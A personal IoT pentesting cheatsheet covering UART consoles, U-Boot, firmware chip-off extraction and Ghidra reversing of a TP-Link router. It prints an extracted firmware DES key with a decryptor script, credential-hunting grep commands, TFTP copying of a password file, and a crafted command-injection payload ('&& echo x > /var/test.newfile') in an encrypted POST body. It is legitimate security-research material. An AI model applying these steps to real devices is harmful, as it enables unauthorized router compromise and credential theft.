# IoT device pentesting cheatsheet

## Attack surface & architecture

 1. Smart device itself (smart lock, smart lamp, etc.)  
    May include Webservers or other things to provice access to apps -> API / webapp pentesting  
    Hardware itself -> UART to get a terminal / chip-off for software reverse engineering
 2. Apps (desktop app, smarthone app, ...)  
    Mobile app pentesting  
 3. Network (Bluetooth, NFC, WLAN, RFID, ...)  
    API pentesting
 4. Cloud service / API (to make the smart device accessable over the internet without setting up a VPN, etc.)  
    API pentesting  
    
Some devices report the actual IP to a cloud service and open up a port (e.g. with UPnP) when instructed to by the cloud - this scenario allow attackers to use the deive as a pivot point:

 1. IoT device constantly ask the cloud service for instructions and updates the IP
 2. Owner of the device using his app logs into the cloud service and get the actual IP 
 3. The clous service instructs the device to open a port when the device connect the next time
 4. The device open the port 
 5. The owner can connect to the public IP of the network where the IoT device resides

This behaviour can be exploited to gain a foothold in the network and if the IoT device is vulnerable to some attacks, it can be used as pivot point to other devices.

**Types of embedded software**

 - Bare metal - developer create all the code itself - used for very speciffic purpose devices e.g.: Arduino projects
 - RTOS (real time OS) - skaled down version of an OS - very stable but minimalistic for speciffic devices / purpose
 - Embedded Linux - full-fledged Linux scaled down to fit the device and available ressources


## OSINT

 - Check `FCC ID` on the device label in case there is one or find the FCC ID for a device online - each product broadcasting a signal need to be approved by FCC in the US.  
   Looking up the FCC ID at `https://fccid.io/` yield documentation, external and internal photos and other details which might become handy.
 - Check datasheets of chips
 - Find firmware of the device to reverse engineer it
 - Lookup already know CVEs - developers make often similiar mistakes - e.g.:  
   `https://app.opencve.io/vendors/?vendor=tp-link`


## Web UI pentesting 

... see `Web_application_pentest_cheet_sheet.md`!

**Do not forget to run a `nmap` scan over all ports with scripts and `-sV`**

 - `nmap -Pn -sV -O -p- --script all 1.2.3.4`
 - `nmap -Pn -sU --top-ports=1000 1.2.3.4`  
   Scan also the top 1000 UDP ports - many IoT devices use UDP!


## UART

UART is a serial interface used to get a serial console and debugging information.

**UART use 4 pins:**

 - `RX` - recive
 - `TX` - transmit
 - `GND` - ground
 - `VCC` - stable 3.3V output

**Testing for pinout**

 1. Maesure continuity to `GND` on the PCB from each UART-pin to find `GND` pin
 2. Boot device and check what pin fluctuate between 3.3V and a lower voltage  
    This is the `TX` pin and the data send out cause the fluctuation
 3. Find the pin with constant 3.3V - this is the `VCC` pin
 4. Left over pin is `TX`

**Connecting UART -> USB adapter**

 - `GND` -> `GND`
 - `RX` -> `TX`
 - `TX` -> `RX`

`VCC` is not neede, `TX` and `RX` must be crossed out from UART to USB adapter to the device.

**What if there are no UART pads or pins on the PCB?**

 - Many MCUs support UART and if you identify the UART pins of the MCU with the datasheet, you can solder wires to the UART legs on the MCU and tie in an UART adapter this way...

**Connecting the PC**

```bash
picocom -b 115200 /dev/ttyUSB0
```

Close connection by holding `CTRL` + `A` and then pressing `X` without releasing `CTRL`.

```bash
minicom -b 115200 -D /dev/ttyUSB0
```

Close connection by holding `CTRL` + `A` and then pressing `X` after releasing `CTRL`.

If this result in "gibberish" output, try different baud-rates (`-b ######`)!

**Displaying debug messages via UART**

Many devices send debug messages via UART - e.g.:

```bash
[ util_execSystem ] 185:  oal_wlan_ra_setSec cmd is "iwpriv ra0 set WPAPSK='7''0''9''7''2''4''6''7'"
[ util_execSystem ] 185:  oal_wlan_ra_updateWlanCfg cmd is "iwpriv ra0 set AccessPolicy=0"
[ util_execSystem ] 185:  oal_wlan_ra_updateWlanCfg cmd is "iwpriv ra0 set SSID='T''P''-''L''i''n''k''_''7''2''2''E'"
```

... we can see here, that user-input like the SSID is escaped with the ' characters to prevent command easy command injection. 

You can see the executed commands for the WiFi setup above and the command issued for ping below:

```bash
[ util_execSystem ] 185:  oal_startPing cmd is "ipping -c 1 -s 64 -w 1 192.168.0.101 -I 192.168.0.1 &"
[ ippingPacketResultHandler ] 4649:  stat: , time: 0, type: 4, pks: 0, result: PING 192.168.0.101 (192.168.0.101): 64 data bytes
```

Those messages help to see if an injection work and reveal all you need to craft an injection if possible. The big issue for testing here is the Web UI, which packs the user input after validating.


## Boot process and bootloader

**Boot sequence**

 1. Primary program loader (stored on MCU) load secondary program loader
 2. Secondary programm loader (bootloader) loaded to RAM and executed (e.g. U-Boot)  
    Loads and starts Linux kernel and hand over control
 3. Linux kernel 
    - unpack root FS
    - run initialisation scripts (starting services, etc.)

**Things to look-out for in the boot log**

 - Filesystem information
 - Partition information
 - Startup scripts
 - Mentioned configuration files

#### U-Boot bootmnu

 - Each vendor has a speciffic way to enter the bootmenu - e.g.:  
   TP-Link: type repeated `tpl` instantly after running the `reboot` command.
 - Commands see: https://github.com/u-boot/u-boot/blob/master/README  
   Some commands may be removed 


**Boot-glitch to enter bootloader menu**

 - IoT devices have the firmware stored on a flash-chip.
 - Connecting the serial out (`SO` or `MISO` or `DO`) pin to ground (`GND`) while booting can force the bootloader to drop in a menu.
 - Reboot the deive and re-try multiple times in different spots of the boot process.


## Busybox

... is a tool combining multiple linux commands in one binary - usage:  

```bash
busybox route
busybox free
...
```

**Data exchange via TFTP:**

 1. Start a TFPT server on your machine:  
    `sudo atftpd --daemon --port 6969 --bind-address 0.0.0.0`  
    Default directory used by `atftpd` is: `/srv/tftp/`
 2. Copy a file from the IoT device to the pentest workstation:  
    `busybox tftp -l /var/tmp/dropbear/dropbearpw -p 192.168.0.101:6969`  
    Save the file in the root TFPT folder
 3. Copy a file from the pentest workstation to the IoT device:  
    `busybox tftp -r hackingtool.bin -g 192.168.0.101:6969`  
    Seve the file in the actual folder

**Getting a full version of busybox**

Busybox allow developers to remove commands from the tool to make it even smaller. The fullversion can be downloaded from:

`https://www.busybox.net/downloads/binaries/`

After downloading a pre-compiled binary for the correct architecture, the file need to be transfered to the device - e.g. with TFTP.

Use the `mount` command to find a RW filesystem like `ramfs`, etc.

**Finding interesting files**

```bash
busybox grep -ir "api" / 2>/dev/null
busybox grep -ir "key" / 2>/dev/null
busybox grep -ir "pass" / 2>/dev/null
busybox grep -ir "admin" / 2>/dev/null
busybox grep -ir "http" / 2>/dev/null

busybox find -iname "*.xml" / 2>/dev/null
busybox find -iname "*.json" / 2>/dev/null
busybox find -iname "*.yml" / 2>/dev/null
busybox find -iname "*.yaml" / 2>/dev/null
busybox find -iname "*.txt" / 2>/dev/null
```


## Firmware recovery

**Methods to access the firmware**

 1. Download from vendor Homepage
 2. Transfer of files via UART and TFTP
 3. Extration from RAM via bootloader:  
    e.g.: unsing the `md` command from U-Boot
 4. Read from ROM in circuit or with the chip-off method

#### Chip off method

**Installation of neede tools on Parrot Sec. OS**

`sudo apt install sasquatch`

 1. De-soldering the flash chip or tr to read it in circuit
 
 2. Find chip identifier - e.g.:  
    ```bash
    ┌─[mark@parrot]─[/FILESERVER/TPLink_WR841N]
    └──╼>$ minipro -L GD25Q64E

    No device found. Which database do you want to display?
    1) TL866A/CS
    2) TL866II+/T48/T56
    3) Abort
    2
    GD25Q64E@SOP8
    GD25Q64E@WSON8
    GD25Q64E@USON8
    GD25Q64E@SOP16
    ```
 
 3. Read the chip with a reader - e.g.:
    ```bash
    minipro -p GD25Q64E@SOP8 -r fw_dump.bin
    ```  
    Best practice is to read the firmware 2-3 times and check if MD5sum matches.

 4. Check contents of the dump - e.g.:
    ```bash
    binwalk -e fw_dump.bin
    ```
    - Contents of the filesystems are then stored in folders, named according to the hexadecimal offsets in the binwalk output.
    - A `Squashfs` filesystem is read-only by nature.
    - Other filesystems like `JFFS2` are read-write.
    - If the extraction seems to miss files, run `sasquatch` manually:  
      ```bash
      sasquatch 100000.squashfs
      ```

**Checking differenc in bin files:**

```bash
vbindiff file1.bin file2.bin
```

**Useful tools:**

 - https://gitlab.com/DavidGriffith/minipro for 
   `XGecu NEW T48 (TL866-3G)` programmer (https://www.aliexpress.com/item/1005004419370100.html?spm=a2g0o.store_pc_home.productList_46951234.1005004419370100)
 - `flashrom` for other programmers - e.g.: CH341A - usage: 
   `flashrom --programmer ch341a_spi --progress -r fw_dump.bin`
 - https://gitlab.com/spectrum70/rvlprog for REVELPROG IS


## Firmware analysis

 1. Finding strings  
    ```bash
    ┌─[mark@parrot]─[/FILESERVER/TPLink_WR841N]
    └──╼>$ strings -n 10 20241222_114611_FLASH_25032.bin
   
    #$#& ##& $#* ##* $#. ##. $#2 ##2 4#6 3#6 3
    $##.""#."##2""#2"##6""#6"##:""#:"C
    (pE`{pC`$j
    bootcmd=tftp
    bootdelay=1
    baudrate=115200
    ethaddr="00:0A:EB:13:09:69"
    ipaddr=192.168.0.2
    serverip=192.168.0.225
    eU-Boot 1.1.3 (Aug 16 2022 - 11:38:19)
    ```  
    This command extracts strings with a minimum length of 10 characters and it yielded information like the `baudrate`, eU-Boot version and many more.

 2. Theking the entropy    
    ```bash
    binwalk -E 20241222_114611_FLASH_25032.bin
    ```  
    This opens a grapth which shows the entropy over the dump. A high entropy close to 1.0 indicates compression and/or encryption. A lower entropy indicates readable text like in incompressed data or headers of the sections.  
    Those headers arealso the reason `binwalk` can split the dumpt into diffent filesystems and uncompress them accordingly.  
    Binwalk frequently misses some parts and the entropy test can reveal if there are more partitions to dig up...
 3. Carving out the U-Boot partition, which was not extracted by `binwalk`:  
    ```bash
    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    53536         0xD120          U-Boot version string, "U-Boot 1.1.3 (Aug 16 2022 - 11:38:19)"
    66048         0x10200         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2986732 bytes
    1048576       0x100000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 3001860 bytes, 552 inodes, blocksize: 262144 bytes, created: 2022-08-16 03:52:07
    ```  
    ... using `dd`:  
    ```bash
    dd if=20241222_114611_FLASH_25032.bin bs=1 skip=53536 count=$((66048-53536)) of=uboot.bin
    ```  
    The U-Boot data start at byte `53536` and ends at the byte `66048`, where the LZMA compressed kernel starts.

**Enumerating the root FS**

 - Run usual Linux enum to find interesting files as stated in the UART connection to find API keys, passwords, etc.
 - Identify interesting binaries for reverse egineering - e.g.: services perfoming configuration changes by issuing system commands to identify injection points or ways to trigger buffer overflows.  
   Identification could be done by a easy search loop:  
   ```bash
   for i in $(find .); do strings -n 4 -f $i 2>/dev/null | grep -i "updateWlanCfg"; done;
   ```  
   The string `updateWlanCfg` was taken from the UART output from before.  
   ❗❗❗ You can also use it to find where encryped files are loaded for decryption by grepping for the filename. ❗❗❗ 


## Reverse engineering the identified binaries

**Finding a known function name**  

 1. Open the file in Ghidra and run the analysis
 2. Use the Symbol tree to find the function of interest

**Finding a knwon string like a filename**

 1. Open the file in Ghidra and run the analysis
 2. Run a full text search in the diassembly view (`Search` -> `Programm Text...` or `CTRL`+`SHIFT`+`E`)
 3. This identifies the functions using that string, load a function of interest by double-clicking on the search results
 4. Click on the Decompile pane and run there the string search with `CTRL`+`F`
 5. Go from there and follow the calls to other functions, etc.
    
#### Sample - reversing the XML file decryption functionality with Ghidra

The initial search as mentioned above for `default_config.xml` yielded this line of C code in the `` function:

```c
iVar3 = dm_readFile("/etc/default_config.xml",__n,__s);
```

Analysing that function was not helpful so I skip the description here. `dm_readFile` do not perform the decryption.

Checking the lines of C-code below that line, resulted in this finding:

```c
local_70 = dm_decryptFile(iVar3,__s,__n >> 1,iVar2);
```

Doubleclicking on the function name, brought me to the fuunction `int dm_decryptFile(uint param_1,undefined4 param_2,uint param_3,int param_4)`, where I started to pick put some informations to make the code more readable:

 1. This line helpde me to rename 2 parameters from the function call:
    ```c
    cdbg_printf(8,"dm_decryptFile",0xbbb,
    "Buffer exceeded, decrypt buf size is %u, but dm file size is %u",param_3,param_1);
    ```  
    `param_3` is the buffer size and `param_1` is the filesize.
 2. This line told me what encryption algorythm is used:
    ```c
    cdbg_printf(8,"dm_decryptFile",0xbc2,"DES decrypt error\n");
    ```
 3. This line is where the decryption must take place
    ```c
    local_var_70 = cen_desMinDo(param_2,param_1,param_4,param_2,auStack_28,0);
    ```  
    ... that mean, `local_var_70` is some form of pointer or result-code, becaue the function itself returns a `int` value.

    Knowing that DES is used, lat me use ChatGPT and that research yielded:

    > Key Features of DES:  
    **Block Cipher:**  
        - DES encrypts data in fixed-size blocks of 64 bits.
        - Each block is processed independently during encryption and decryption.  
    **Key Length:**  
        - DES uses a 56-bit key for encryption.  
        - While the key is technically 64 bits long, 8 bits are used for parity checks, reducing the effective key length to 56 bits.  
    **Symmetric Key:**  
        - The same key is used for both encryption and decryption.  
        - Key secrecy is crucial for security.

    `64` bits are `8` bytes - so the key need to be 8 bytes long. 

 4. The research results made the following line stand yout for me:
    ```c
    undefined auStack_28 [8];
    ...
    memcpy(auStack_28,&DAT_000c84e0,8);
    ```  
    Here is a 8 element array of type `undefined` created and then those array is filled with the contents of `&DAT_000c84e0`, which is 8 bytes long!

With those informations I could rename some of the variables in the C code and make the function much more readable:

```c
int dm_decryptFile(uint dm_fileSize,undefined4 param_2,uint decrypt_bufferSize,int param_4)
{
  int iVar1;
  undefined des_key [8];
  int result;

  memcpy(des_key,&DAT_000c84e0,8);
  if (decrypt_bufferSize < dm_fileSize) {
    cdbg_printf(8,"dm_decryptFile",0xbbb,
                "Buffer exceeded, decrypt buf size is %u, but dm file size is %u",decrypt_bufferSize
                ,dm_fileSize);
    result = 0;
  }
  else {
    result = cen_desMinDo(param_2,dm_fileSize,param_4,decrypt_bufferSize,des_key,0);
    iVar1 = result;
    if (result == 0) {
      cdbg_printf(8,"dm_decryptFile",0xbc2,"DES decrypt error\n");
    }
    else {
      do {
        result = iVar1;
        if (((undefined *)(param_4 + result))[-1] != '\0') break;
        iVar1 = result + -1;
      } while (result != 0);
      *(undefined *)(param_4 + result) = 0;
    }
  }
  return result;
}
```

Doubleclicking on `&DAT_000c84e0` revealed the DES key:

```c
                                DAT_000c84e0               REF[1]:     dm_decryptFile:0008d9c0(*)
000c84e0 47          ??         47h    G
000c84e1 8d          ??         8Dh
000c84e2 a5          ??         A5h
000c84e3 0f          ??         0Fh
000c84e4 f9          ??         F9h
000c84e5 e3          ??         E3h
000c84e6 d2          ??         D2h
000c84e7 cb          ??         CBh
```

... which is: `0x478da50ff9e3d2cb`

Knowing that, I can write a decoder in Python3:

```python
import sys
from Cryptodome.Cipher import DES

KEY = bytes.fromhex("478da50ff9e3d2cb")

with open(sys.argv[1], "rb") as infile:
    encrypted_data = infile.read()

cipher = DES.new(KEY, DES.MODE_ECB)
decrypted_data = cipher.decrypt(encrypted_data)
print(decrypted_data.decode("UTF-8"))
```

The mode `MODE_ECB` was a lucky guess, if that one did not work, you need to try the other potential modes until one work.

#### Tracing function calls

Back in the UART connection we had the log line:

`[ util_execSystem ] 185:  oal_wlan_ra_updateWlanCfg cmd is "iwpriv ra0 set SSID='T''P''-''L''i''n''k''_''7''2''2''E'"`

... which indicates, that `util_execSystem(...)` is running the system commands. Finding and reverse-engineering that function yielded that key findings (see comments):

```c
undefined4 util_execSystem(undefined4 param_1,char *format,undefined4 param_args,undefined4 param_resc)
{
  char *semicolon_pos;
  int ret_code;
  undefined4 result;
  undefined4 va_args;
  undefined4 local_resc;
  char command_formated [520];
  va_args = param_args;
  local_resc = param_resc;

  // Fill command_formated with 0x00
  memset(command_formated,0,0x200); 
  // Format command for execution (adding user input into the command)
  ret_code = vsnprintf(command_formated,0x1ff,format,&va_args);
  // Find ';' in the formated string
  semicolon_pos = strchr(command_formated,L';');
  if (semicolon_pos == (char *)0x0) {
    result = 0;
    if (0 < ret_code) {
      // Execute command 
      ret_code = system(command_formated);
      if (ret_code == -1) {
        perror("util_execSystem call error:");
        result = 0xffffffff;
      }
    }
  }
  else {
    cdbg_printf(8,"util_execSystem",0x8b,"Parameter contains illegal character!");
    result = 0xffffffff;
  }
  return result;
}
```

This mean, that command injection with `;` is prohibited but `&&`, `||`, `|` and `${LS_COLORS:10:1}` should work if they are not filtered in the function calling `util_execSystem(...)`.

A quick search reveal the place where we can search for those functions:

```bash
┌──[mark@parrot]─[/FILESERVER/TPLink_MR2030/_20241217_224639_W25Q64JV.bin.extracted/squashfs-root]
└──╼>$ for i in $(find .); do strings -n 4 -f $i 2>/dev/null | egrep -i "iwpriv.*SSID"; done;

./lib/modules/kmdir/kernel/drivers/net/wireless/mt_wifi_ap/mt_wifi.ko: eg: iwpriv ra0 set BcnReq=<Aid>-<Duration>-<RegulatoryClass>-<BSSID>-<SSID>-<MeasureCh>-<MeasureMode>-<ChRegClass>
./lib/libcmm.so: iwpriv %s set HideSSID=%d
./lib/libcmm.so: iwpriv %s set SSID=%s
./lib/libcmm.so: iwpriv %s set ApCliBssid=%s
./lib/libcmm.so: iwpriv %s set ApCliSsid=%s
```

This string is then used in multiple places in the code - all of them can be found `Search` -> `Programm Text...` or `CTRL`+`SHIFT`+`E`

#### Reverse engineering the Web UI

Checking the web form source code in the browser reveal:

```html
<input type="button" class="button L T T_save" id="saveBtn" value="Save" onclick="doSubmit()">
```

... the submit button call the JS function `doSubmit()`, which can be invoked from the JS console in the browser with a prepeneded `debugger` stateent:

```javascript
debugger;doSubmit();
```

Stepping into the JS code yield this function:

```javascript
toStr: function (data, sign1, sign2, tailing) {
  return data ? (
          typeof data === 'string' &&
          data ||
          data instanceof Array &&
          data.join(sign2) + (tailing ? sign2 : '') ||
          $.obj2str(data, sign1, sign2, tailing)
        ) : ''
  },
  ...
```

... which create this values:

```javascript
data
Array(3) [ "localTimeZone=+00:00", "NTPServer1=eu.pool.ntp.org", "NTPServer2=europe.pool.ntp.org" ]
sign1
"="
sign2
"\r\n"
tailing
true
```

The `data` array is then converted into a string with the following code:

```javascript
if (!type || !oid) {
          return false
        }
        stack = stack ? stack : '0,0,0,0,0,0';
        pStack = pStack ? pStack : '0,0,0,0,0,0';
        attrs = $.toStr(attrs, '=', '\r\n', true);
        attrs = attrs.replace(/__stack=[0-9,]*\r\n/, '');
        var ret = null;
        ...
```

... which produce this data:

```javascript
attrs
"localTimeZone=+00:00\r\nNTPServer1=eu.pool.ntp.org\r\nNTPServer2=europe.pool.ntp.org\r\n"
```

A 2nd run createed this string for the time data:

```javascript
attrs
"year=1970\r\nmonth=1\r\nday=3\r\nhours=20\r\nminutes=5\r\nseconds=54\r\n"
```

Stepping further into the execution of code revealed this code snippet:

```javascript
 exe: function (hook, unerr, securityLevel) {
        var url = '/cgi?';
        var data = '';
        var index = 0;
        var obj;
        var bAnsi = false;
        var tmpdata = '';
        if (INCLUDE_LOGIN_GDPR_ENCRYPT && securityLevel != 0) {
          try {
                url = '/cgi_gdpr?'
          } catch (e) {
          }
        }
        ...
```

... which is pretty interesting! There seem to be 2 endpoints:

 - `/cgi?` seems to be unprotected and recive data maybe unencrypted
 - `/cgi_gdpr?` is protected with some form of encryption

There should be a way to force the router to communicate unencrypted or with less security. That can be looked at later...

The following code:

```javascript
if (INCLUDE_LOGIN_GDPR_ENCRYPT && url.match('/cgi_gdpr') != null) {
  while (obj = $.as.shift()) {
        tmpdata += obj[0] + (obj[1] ? '=' + obj[1] : '') + '&';
        data += '[' + obj[2] + '#' + obj[3] + '#' + obj[4] + ']' + index + ',' + obj[6] + '\r\n' + obj[5];
        index++
  }
  tmpdata = tmpdata.substr(0, tmpdata.length - 1);
  tmpdata = tmpdata + '\r\n' + data;
  data = tmpdata
}
```

... mangles the data string into this format:

```javascript
data
"2&2\r\n[TIME#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\nlocalTimeZone=+00:00\r\nNTPServer1=eu.pool.ntp.org\r\nNTPServer2=europe.pool.ntp.org\r\n[HOUR#0,0,0,0,0,0#0,0,0,0,0,0]1,6\r\nyear=1970\r\nmonth=1\r\nday=3\r\nhours=20\r\nminutes=5\r\nseconds=54\r\n"
```

... which is then passed into this code snippet:

```javascript
var stmp = {};
stmp.data = {};
if (s.data.match('/cgi/login') == null) {
  stmp.data = $.Iencryptor.AESEncrypt(s.data, 0)
} else {
  stmp.data = $.Iencryptor.AESEncrypt(s.data, 1)
}
s.data = 'sign=' + stmp.data.sign + '\r\ndata=' + stmp.data.data + '\r\n'
```

... which run this code to encrypt the data: 

```javascript
Encryptor.prototype.AESEncrypt = function (data, isLogin) {
  var result = {};
  result.data = this.aes.encrypt(data);
  var dataLen = result.data.length;
  result.sign = this.getSignature(this.seq + dataLen, isLogin);
  return result
};
```

Prettified the important lines are line 183-185 in the file ` tpEncrypt.js` on the MR2030!

Having a closer look with the debugger I cound this data in the object `this.aes`:

```yaml
iv: "5919123303609076"
key: "2420164152202434"
```

Those values are static between different submissions and different pages. The IV and KEY are only changed when the session ends and a new session is created.

Lookinf further into the execution revealed this code snippet:

```javascript
Encryptor.prototype.getSignature = function (seq, isLogin) {
  if (isLogin == 1) {
        var s = this.aesKeyString + '&h=' + this.hash + '&s=' + seq ||
        this.seq
  } else {
        var s = 'h=' + this.hash + '&s=' + seq ||
        this.seq
  }
  var sign = this.rsa.encrypt(s);
  return sign
};
```

... which create this string:

```javascript
s
"h=476a554104aa4e700bf2d05fcead100a&s=575280594"
```

But that was already to far... 

Because IV and KEY do not change between submissions or pages all I need to create a valid POST request body is the following JS code:

```javascript
data = $.Iencryptor.AESEncrypt("2&2\r\n[TIME#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\nlocalTimeZone=+00:00\r\nNTPServer1=eu.pool.ntp.org\r\nNTPServer2=europe.pool.ntp.org && echo x > /var/test.newfile\r\n[HOUR#0,0,0,0,0,0#0,0,0,0,0,0]1,6\r\nyear=1970\r\nmonth=1\r\nday=3\r\nhours=20\r\nminutes=5\r\nseconds=54\r\n", 0); console.log('sign=' + data.sign + '\r\ndata=' + data.data);
sign=24d3c7c8f7c6d6c98b4d9f304b0ef6788dcc9e69e74b6aa7937956a07a1953cf3884427d2574e38acc08c7645017eab5ad78828d0ac0ff61e451831fced971bf
data=g3Gbm5mZiND1JvNUO/GNB2VC50VNW48wmrMwRDmKXmIuPzTeDvNMD5qTK8RUNDJslZd9A4o8AaYnBPe8nhMj/V3tYNBh2asmU2E1dHg01BAvAd31baYN10xLTsnp5oKDdximCAma6RJgnR0FKCx6q8cih62HNe6rcF/y2/gToqiMwEn/ekY/93+SV4YPjSmFFdAlFBi/VGH9fY5zv3k//+LjS3zzHCuBwoG9rdE45bC00iv7HrIVGb4RVKnW8Mmhu6Re4F5/MQiEbfWX1by+8xOSg1IfLNI555O5QdRy5SxAulogwW83KtRtJUHaQlgxYfNgsZAxYpvb0gCoQ1Hwjg== debugger eval code:2:9
```

Here I have set 

```
NTPServer2=europe.pool.ntp.org && echo x > /var/test.newfile
```

... and when I submit the resulting 2 line string in the POST request body with BurpSuite - I can see the following output in the UART terminal:

```
[ dm_checkString ] 1320:  String parameter NTPServer2's value(europe.pool.ntp.org && echo x > /var/test.newfile) is exceeded max length 32.
```


**Useful tools:**

 - Ghidra (https://ghidra-sre.org/)
 - Binary Ninja (https://binary.ninja/free/)  
   Only for ARM and x86/64 code - no MIPS, RISC, etc. support!
 - CyberChef (https://cyberchef.io/)  
   Online tool to en-/decode and en-/decrypt with various algorythms


## RAM dumping

... some contents on the ROM chip or some files in the FS may be encrypted - dumping the RAM contents allow us to get a hold of the decrypted data!




